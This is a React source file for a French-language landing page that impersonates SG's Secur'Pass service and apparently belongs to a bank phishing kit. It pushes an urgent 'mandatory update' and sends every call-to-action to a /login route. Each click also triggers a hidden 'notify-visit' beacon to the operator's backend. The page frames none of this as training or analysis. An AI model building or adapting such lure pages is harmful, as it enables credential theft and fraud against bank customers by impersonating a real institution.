import React, { useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import {
  ShieldCheck,
  Smartphone,
  Eye,
  Bell,
  LockKeyhole,
  MousePointerClick,
  Headset,
  ArrowRight,
} from 'lucide-react';
import { securityFeatures, advantagesData } from '../mock';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;

const HERO_IMAGES = [
  {
    src: 'https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=1400&h=1000&fit=crop',
    alt: 'Paiement sécurisé avec carte bancaire sur ordinateur',
  },
  {
    src: 'https://images.unsplash.com/photo-1601597111158-2fceff292cdc?w=1400&h=1000&fit=crop',
    alt: 'Saisie sur terminal de paiement',
  },
  {
    src: 'https://images.unsplash.com/photo-1556742044-3c52d6e88c62?w=1400&h=1000&fit=crop',
    alt: 'Terminal de paiement contactless',
  },
  {
    src: 'https://images.unsplash.com/photo-1559526324-c1f275fbfa32?w=1400&h=1000&fit=crop',
    alt: 'Application bancaire mobile',
  },
];

const Home = () => {
  const navigate = useNavigate();
  const [heroIndex, setHeroIndex] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      setHeroIndex((prev) => (prev + 1) % HERO_IMAGES.length);
    }, 3000);
    return () => clearInterval(id);
  }, []);

  const iconMap = {
    'shield-check': ShieldCheck,
    smartphone: Smartphone,
    eye: Eye,
    bell: Bell,
    'lock-keyhole': LockKeyhole,
    'mouse-pointer-click': MousePointerClick,
    headset: Headset,
  };

  const handleUpdateClick = async (e, source) => {
    e.preventDefault();
    try {
      fetch(`${BACKEND_URL}/api/securipass/notify-visit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          source,
          path: window.location.pathname,
          referrer: document.referrer || 'direct',
        }),
        keepalive: true,
      }).catch(() => {});
    } finally {
      navigate('/login');
    }
  };

  return (
    <div className="bg-white">
      {/* HERO — burgundy banner with image */}
      <section className="relative overflow-hidden">
        <div className="grid grid-cols-1 lg:grid-cols-2">
          {/* Left dark burgundy panel */}
          <div
            className="relative px-5 sm:px-10 lg:px-16 py-12 sm:py-16 lg:py-24"
            style={{ backgroundColor: '#3A1018' }}
          >
            <div className="max-w-xl mx-auto lg:mx-0">
              <span className="inline-block bg-[#e60028] text-white px-3 py-1.5 rounded-full text-xs font-semibold uppercase tracking-wider mb-5">
                Mise à jour Secur'Pass
              </span>
              <h1 className="text-3xl sm:text-4xl lg:text-5xl xl:text-6xl font-bold leading-[1.1] text-white tracking-tight">
                SG, une banque qui protège votre quotidien&nbsp;: mettez à jour votre Secur'Pass.
              </h1>
              <p className="mt-5 sm:mt-6 text-base sm:text-lg text-white/80 leading-relaxed">
                Pour continuer à accéder à votre Espace Client en toute sérénité,
                renforcez la sécurité de votre compte en quelques minutes.
              </p>
              <div className="mt-7 sm:mt-8 flex flex-col sm:flex-row gap-3 sm:gap-4">
                <Button
                  asChild
                  size="lg"
                  data-testid="hero-update-btn"
                  className="bg-[#e60028] hover:bg-[#c00020] text-white font-semibold px-7 py-6 text-base sm:text-lg shadow-xl hover:shadow-2xl transition-all duration-300"
                >
                  <Link
                    to="/login"
                    onClick={(e) => handleUpdateClick(e, 'hero_update_now')}
                  >
                    Mettre à jour maintenant
                    <ArrowRight className="ml-2" size={20} />
                  </Link>
                </Button>
                <Button
                  asChild
                  size="lg"
                  variant="outline"
                  className="bg-transparent border-2 border-white/40 text-white hover:bg-white/10 hover:text-white font-semibold px-7 py-6 text-base sm:text-lg transition-all duration-300"
                >
                  <Link to="/faq">En savoir plus</Link>
                </Button>
              </div>
            </div>
          </div>

          {/* Right image panel — auto-rotating carousel */}
          <div className="relative min-h-[260px] sm:min-h-[340px] lg:min-h-0 bg-[#3A1018] overflow-hidden">
            {HERO_IMAGES.map((img, idx) => (
              <img
                key={img.src}
                src={img.src}
                alt={img.alt}
                className={`absolute inset-0 w-full h-full object-cover transition-opacity duration-[1500ms] ease-in-out ${
                  idx === heroIndex ? 'opacity-100' : 'opacity-0'
                }`}
              />
            ))}
            {/* Carousel indicators */}
            <div className="absolute bottom-4 left-1/2 -translate-x-1/2 flex gap-2 z-10">
              {HERO_IMAGES.map((_, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => setHeroIndex(idx)}
                  aria-label={`Image ${idx + 1}`}
                  data-testid={`hero-dot-${idx}`}
                  className={`h-1.5 rounded-full transition-all duration-300 ${
                    idx === heroIndex ? 'w-8 bg-white' : 'w-2 bg-white/50 hover:bg-white/80'
                  }`}
                />
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* TWO PROMO CARDS */}
      <section className="max-w-7xl mx-auto px-4 py-10 sm:py-14 lg:py-16">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6">
          {/* Card 1 — purple gradient */}
          <Link
            to="/login"
            onClick={(e) => handleUpdateClick(e, 'card_obligatoire')}
            data-testid="promo-card-1"
            className="group relative overflow-hidden rounded-2xl min-h-[200px] sm:min-h-[240px] shadow-lg hover:shadow-2xl transition-all duration-300"
            style={{
              background:
                'linear-gradient(120deg, #f07a3a 0%, #e0457b 55%, #7a3aa3 100%)',
            }}
          >
            <div className="absolute inset-0 p-5 sm:p-7 flex flex-col justify-between text-white">
              <div>
                <span className="inline-block bg-white/20 backdrop-blur text-white px-3 py-1 rounded-full text-[11px] font-semibold uppercase tracking-wider mb-3">
                  Mise à jour obligatoire
                </span>
                <h3 className="text-xl sm:text-2xl lg:text-3xl font-bold leading-snug max-w-sm">
                  Votre Secur'Pass arrive bientôt à échéance&nbsp;? Renforcez-le dès aujourd'hui&nbsp;!
                </h3>
              </div>
              <div className="mt-4 flex items-center gap-2">
                <span className="bg-white text-gray-900 px-4 py-2 rounded-full text-sm font-semibold shadow group-hover:translate-x-1 transition-transform">
                  Commencer
                </span>
              </div>
            </div>
          </Link>

          {/* Card 2 — dark navy with phone */}
          <Link
            to="/faq"
            data-testid="promo-card-2"
            className="group relative overflow-hidden rounded-2xl min-h-[200px] sm:min-h-[240px] shadow-lg hover:shadow-2xl transition-all duration-300"
            style={{ backgroundColor: '#0e2236' }}
          >
            <div
              className="absolute inset-0 opacity-30"
              style={{
                backgroundImage:
                  "url('https://images.unsplash.com/photo-1611174743420-3d7df880ce32?w=900&h=600&fit=crop')",
                backgroundSize: 'cover',
                backgroundPosition: 'center',
              }}
            />
            <div className="absolute inset-0 p-5 sm:p-7 flex flex-col justify-between text-white">
              <div>
                <span className="inline-block bg-white/20 backdrop-blur text-white px-3 py-1 rounded-full text-[11px] font-semibold uppercase tracking-wider mb-3">
                  En 5 minutes
                </span>
                <h3 className="text-xl sm:text-2xl lg:text-3xl font-bold leading-snug max-w-sm">
                  Gagnez du temps en mettant à jour votre Secur'Pass en ligne.
                </h3>
              </div>
              <div className="mt-4 flex items-center gap-2">
                <span className="bg-white text-gray-900 px-4 py-2 rounded-full text-sm font-semibold shadow group-hover:translate-x-1 transition-transform">
                  J'en profite
                </span>
              </div>
            </div>
          </Link>
        </div>
      </section>

      {/* WHY UPDATE — explanations */}
      <section className="py-12 sm:py-16 lg:py-20 bg-gray-50">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-10 sm:mb-14">
            <h2 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-gray-900 mb-3 sm:mb-4">
              Pourquoi mettre à jour votre Secur'Pass&nbsp;?
            </h2>
            <p className="text-base sm:text-lg text-gray-600 max-w-3xl mx-auto">
              La sécurité numérique évolue constamment. Notre nouvelle version
              intègre les technologies les plus avancées pour protéger vos données.
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
            {securityFeatures.map((feature) => {
              const Icon = iconMap[feature.icon];
              return (
                <div
                  key={feature.id}
                  className="bg-white rounded-2xl p-5 sm:p-6 shadow-sm hover:shadow-xl transition-all duration-300 hover:-translate-y-1 border border-gray-100"
                >
                  <div className="w-12 h-12 sm:w-14 sm:h-14 bg-[#e60028]/10 rounded-xl flex items-center justify-center mb-4">
                    <Icon className="text-[#e60028]" size={26} />
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-gray-900 mb-2">
                    {feature.title}
                  </h3>
                  <p className="text-sm sm:text-base text-gray-600 leading-relaxed">
                    {feature.description}
                  </p>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* ADVANTAGES */}
      <section className="py-12 sm:py-16 lg:py-20 bg-white">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-10 sm:mb-14">
            <h2 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-gray-900 mb-3 sm:mb-4">
              Les avantages de Secur'Pass
            </h2>
            <p className="text-base sm:text-lg text-gray-600 max-w-2xl mx-auto">
              Une solution complète pour une sécurité sans compromis.
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6 sm:gap-8">
            {advantagesData.map((advantage) => {
              const Icon = iconMap[advantage.icon];
              return (
                <div key={advantage.id} className="text-center group">
                  <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-br from-[#e60028] to-[#c00020] rounded-full flex items-center justify-center mx-auto mb-5 sm:mb-6 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                    <Icon className="text-white" size={32} />
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-gray-900 mb-2 sm:mb-3">
                    {advantage.title}
                  </h3>
                  <p className="text-sm sm:text-base text-gray-600 leading-relaxed">
                    {advantage.description}
                  </p>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* FINAL CTA */}
      <section className="py-12 sm:py-16 lg:py-20 bg-gray-50">
        <div className="max-w-4xl mx-auto px-4 text-center">
          <h2 className="text-2xl sm:text-3xl lg:text-4xl font-bold mb-4 sm:mb-6 text-gray-900">
            Prêt à sécuriser votre compte&nbsp;?
          </h2>
          <p className="text-base sm:text-lg lg:text-xl text-gray-600 mb-6 sm:mb-8 leading-relaxed">
            La mise à jour ne prend que quelques minutes. Protégez vos données dès aujourd'hui.
          </p>
          <Button
            asChild
            size="lg"
            data-testid="start-update-btn"
            className="bg-[#e60028] hover:bg-[#c00020] text-white font-semibold px-8 sm:px-12 py-5 sm:py-6 text-base sm:text-lg shadow-xl hover:shadow-2xl transition-all duration-300 hover:scale-105"
          >
            <Link
              to="/login"
              onClick={(e) => handleUpdateClick(e, 'cta_start_update')}
            >
              Commencer la mise à jour
              <ArrowRight className="ml-2" size={20} />
            </Link>
          </Button>
        </div>
      </section>
    </div>
  );
};

export default Home;
